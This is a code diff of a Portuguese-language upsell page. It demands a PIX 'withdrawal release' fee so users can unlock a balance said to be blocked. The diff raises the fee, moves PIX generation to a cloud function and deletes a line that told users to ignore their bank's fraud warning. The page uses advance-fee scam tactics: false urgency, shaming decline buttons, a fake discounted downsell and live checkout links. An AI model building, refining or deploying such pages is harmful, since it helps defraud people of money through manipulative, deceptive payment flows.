@@ -40,7 +40,7 @@
 
       <p class="closing-pitch">Confirme agora e seu saldo cai na hora, direto na sua chave PIX. Essa liberação só fica disponível nesta tela, se você sair, seu saque volta pra fila normal.</p>
 
-      <p class="price-line">Liberação de Saque: <strong class="price-line-value">R$ 17,00</strong></p>
+      <p class="price-line">Liberação de Saque: <strong class="price-line-value">R$ 19,90</strong></p>
 
       <a href="#" class="cta" id="accept-main">LIBERAR MEU SALDO AGORA</a>
       <button type="button" class="decline-link" id="decline-main">Não, prefiro deixar meu saldo bloqueado</button>
@@ -53,7 +53,7 @@
 
       <p class="notice-text">Como você já passou pela verificação inicial, conseguimos reduzir o custo da Liberação de Saque nessa etapa. Você ainda pula a fila inteira e recebe o PIX na hora.</p>
 
-      <p class="price-line">Liberação de Saque: <span class="price-line-old">R$ 17,00</span> <strong class="price-line-value">R$ 9,95</strong></p>
+      <p class="price-line">Liberação de Saque: <span class="price-line-old">R$ 19,90</span> <strong class="price-line-value">R$ 9,95</strong></p>
 
       <a href="#" class="cta" id="accept-downsell">SIM, QUERO POR R$ 9,95</a>
       <button type="button" class="decline-link" id="decline-downsell">Não, prefiro perder esse valor e deixar meu saldo travado</button>
@@ -63,17 +63,15 @@
     <div id="pix-panel" class="pix-panel" hidden>
       <p class="pix-panel-title">Escaneie ou copie o código Pix</p>
       <p class="pix-panel-subtitle">Assim que o pagamento cair, seu saque continua automaticamente pra próxima etapa.</p>
-      <div class="pix-qr-box" id="pix-qr-box" title="Clique para copiar o código Pix">
+      <div class="pix-qr-box">
         <img id="pix-qr-img" src="" alt="QR Code Pix">
       </div>
-      <p class="pix-code-label">Pix copia e cola (clique pra copiar)</p>
-      <div class="pix-code-row" id="pix-code-row">
+      <p class="pix-code-label">Pix copia e cola</p>
+      <div class="pix-code-row">
         <input type="text" id="pix-code-input" readonly value="">
         <button type="button" class="pix-copy-btn" id="pix-copy-btn">Copiar</button>
       </div>
-      <p class="pix-copied-feedback" id="pix-copied-feedback" hidden>✓ Código copiado!</p>
       <p class="pix-status" id="pix-status-text">Aguardando pagamento...</p>
-      <p class="pix-fraud-note">Seu banco pode exibir um aviso de prevenção a fraudes por ser a primeira vez que você paga pra essa chave. Isso é normal, pode confirmar o pagamento tranquilamente.</p>
       <p class="pix-error" id="pix-error-text" hidden></p>
     </div>
 
@@ -109,13 +107,14 @@
     window.UPSELL_CONFIG = {
       step: 'saque',
       pagePath: '/upsell-saque/',
-      mainPrice: 17.00,
+      mainPrice: 19.90,
       downsellPrice: 9.95,
       mainCheckoutUrl: 'https://go.frendz.com.br/a9reeqwbim',
       downsellCheckoutUrl: 'https://go.frendz.com.br/ibeil',
-      // PIX gerado direto na página via api/create-pix.php (não sai pro
-      // checkout hospedado). Se a chamada falhar, upsell-flow.js cai pro checkout acima.
+      // PIX gerado direto na página via Cloud Function (não sai pro checkout
+      // hospedado). Se a função falhar, upsell-flow.js cai pro checkout acima.
       pix: {
+        functionsBaseUrl: 'https://us-central1-madame-67e19.cloudfunctions.net',
         mainChargeKey: 'saque_main',
         downsellChargeKey: 'saque_downsell'
       },
